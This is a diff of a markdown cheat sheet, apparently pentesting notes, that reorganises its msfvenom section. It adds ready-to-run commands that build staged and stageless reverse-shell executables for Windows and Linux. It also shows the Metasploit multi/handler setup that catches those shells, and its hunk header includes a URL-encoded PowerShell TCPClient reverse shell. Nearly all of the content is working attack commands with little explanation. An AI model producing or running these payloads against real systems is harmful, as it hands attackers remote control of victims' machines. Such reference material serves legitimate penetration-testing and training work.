@@ -80,24 +80,29 @@ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient
 
 ## MSFVENOM 
 
-Staged meterpreter reverse shell for Linux 
+Windows
 ```
-msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=10.10.10.10 LPORT=4444 > shell.elf
+# STAGED
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
 
-# This payload works really well with metasploit multi/handler
-# must be very precise from the payload created
+# STAGELESS
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
+```
+
+LINUX
+```
+# STAGED 
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
+# STAGELESS 
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
+```
+
+Once payload is created. Run multi handler 
+```
 msfconsole -q
 use multi/handler
 set PAYLOAD linux/x86/meterpreter/reverse_tcp
 set LHOST 10.10.10.10
 set LPORT 4444
 exploit -j # To run as background job 
-
 ```
-
-Stage Reverse shell for Windows
-```
-msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=10.10.10.10 LPORT=4444 > shell.exe
-# same as the above multi/handler settings
-```
-
